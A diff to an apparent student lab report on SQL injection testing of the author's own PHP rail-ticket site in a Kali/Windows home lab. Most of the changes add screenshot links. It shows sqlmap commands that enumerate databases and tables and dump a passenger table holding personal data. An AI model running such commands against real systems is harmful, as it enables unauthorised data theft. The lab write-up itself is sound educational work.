@@ -70,7 +70,8 @@ In this penetration testing, we find the website has many vulnerable pages. As t
 
 
 ## 2. Methodology
-image
+![Penetration Testing Methodology](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture0.png)
+
 ### 2.1. Planning
 
 We focus on the website and check the details of the php files that is used to build the website. By checking the php files and sql queries, it seems that there is a vulnerability which can be exploitable using SQL Injection. So we planned to create a victim and attacker machine in our home lab and test the website. 
@@ -94,7 +95,10 @@ The list of using software and OS for this pentest are:
 4.	XAMPP
 5.	sqlmap (Pre build in Kali Linux)
 
-image  
+![Windows 10 Home VM](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture1.png)  
+
+*Fig: 3.1.1*
+
 **Windows 10 Home:** We download the iso file from Microsoft and install it into our VMWare Machine. The hardware configuration for this OS:
 1.	Ram: 4GB
 2.	HDD: 60GB
@@ -102,7 +106,10 @@ image
 4.	Network Adapter: NAT
 5.	IP Address: 192.168.213.130
 
-image  
+![Kali Linux VM](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture2.png)  
+
+*Fig: 3.1.2*
+
 **Kali Linux:** We download the image file from the kali linux website and then install it into the VMWare Machine. This used as attacker machine. The hardware configuration for this OS:
 1.	Ram: 2GB
 2.	HDD: 80.1GB 
@@ -112,25 +119,41 @@ image
 
 
 ## 3.2.	 Lab Setup
-We install these two OS in the machine. The first thing we need to setup the network so that these two machines can talk with each other. We configure the network to NAT and VMWare by default build network communication. To check if they can communicate each, we can just ping with each others ip address. To check it, run the “ifconfig” (fig:3.2.2) in kali linux to get the network details in kali linux and run “ipconfig” (fig:3.2.1) in the windows cmd to get all the information.
+We install these two OS in the machine. The first thing we need to setup the network so that these two machines can talk with each other. We configure the network to NAT and VMWare by default build network communication. To check if they can communicate each, we can just ping with each others ip address. 
+
+![Windows IP Config](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture3.png)
+
+*Fig: 3.2.1*
+
+To check it, run the “ifconfig” (fig:3.2.2) in kali linux to get the network details in kali linux and run “ipconfig” (fig:3.2.1) in the windows cmd to get all the information.
+
+![Kali IP Config](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture4.png)
+
+*Fig: 3.2.2*
+
 After getting the IP address, run the ping command.
-In Kali, run :-
+In Kali, run:-
 ```
 ping 198.168.213.130
 ```
+![Ping from Kali to Windows](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture5.png)
 
+*Fig: 3.2.3*
 
-
-In Windows VM :-
+In Windows VM:-
 ```
 ping 198.168.213.128
 ```
+![Ping from Windows to Kali](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture6.png)
+
+*Fig: 3.2.4*
 
 After doing ping, if they can communicate, they will ping each other and response back (fig: 3.2.3 & 3.2.4). But here, we off the firewall of the windows VM for communication. Also, we need to setup a rule in the firewall system so that they can communicate. To set the rules, the steps are:
 
 *Allow ICMP (Ping) in Windows Firewall:*
  
 Windows Firewall blocks ICMP (ping) requests by default. We can enable ping by creating a firewall rule.  
+
 •	Open **Control Panel** on your Windows machine.  
 •	Go to **System and Security -> Windows Defender Firewall -> Advanced Settings.**  
 •	In the left pane, click **Inbound Rules**.  
@@ -143,6 +166,10 @@ Windows Firewall blocks ICMP (ping) requests by default. We can enable ping by c
 •	Name the rule, e.g., "Allow ICMPv4 (Ping)", and click Finish.
 This should allow your Kali machine to ping the Windows machine. After that we run the website (fig: 3.2.5) on windows machine. So we install the XAMPP and run the website. Now we properly setup our lab.  
 
+![Vulnerable Website](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture7.png)
+
+*Fig: 3.2.5*
+
 ### 3.3.	 Performing Attack & Findings
 
 At first, we need to check can we access the website from attacker machine (kali) to victim machine (windows). 
@@ -153,27 +180,46 @@ curl http://<windows_vm_ip>/yourwebsite
 ```
 curl http://198.168.213.130/CSE370_Project-main/home.php
 ```
+![Access the website from kali machine](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture8.png)
+
+*Fig: 3.3.1*
+
 After running the command, if there come html as a output (fig: 3.3.1), it means it can track the website from attacking machine. 
 
 Now we will findout the vulnerable page in this website. We will try on those page where user need to gives input. So we will try on signin page. To doing the attack automate, we used sqlmap. 
 
 In attack machine, run the command:
 ```
-curl http://198.168.213.130/CSE370_Project-main/home.php
+curl http://198.168.213.130/CSE370_Project-main/signin.php
 ```
+![Sign in PHP page](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture9.png)
+
+*Fig: 3.3.2*
+
 By running this command (fig: 3.3.2), we get an idea which type of info we can apply for SQL Injection. As those credintials in fig mention to login page. After that run the command: 
 ```
 sqlmap -u http://198.168.213.130/CSE370_Project-main/signin.php  --data="phone=123456&password=anything" –dbs
 ```                        
+![Databases](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture10.png)
+
+*Fig:3.3.3*
 
 We got all the details about the database (fig:3.3.3). To get more information about the user we can search for table names and data into those tables. First to findout all the table names of a database, run:	
 ```
 sqlmap -u http://198.168.213.130/CSE370_Project-main/signin.php --data="phone=123456&password=anything" -D railticket –tables
 ```
+![Table Names](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture11.png)
+
+*Fig: 3.3.4*
+
 This will give all the table available in dataset “railticket” (Fig: 3.3.4). To get the data from one of those tables, run:
 ```
 sqlmap -u http://198.168.213.130/CSE370_Project-main/signin.php --data="phone=123456&password=anything" -D railticket -T passenger –dump
 ```
+![Details](https://github.com/AbuHanifSiam/SQLi-Injection-Testing-on-a-Website/blob/d2980f3745beaba8900d027c0d00b147aaaf16d5/SQLi%20Pentest/Picture12.png)
+
+*Fig: 3.3.5*
+
 This give all the information of the users (fig: 3.3.5). There personal information and other. So our SQL Injection is successful and we find vulnerability.
 
 ### 3.4.	 Impact:
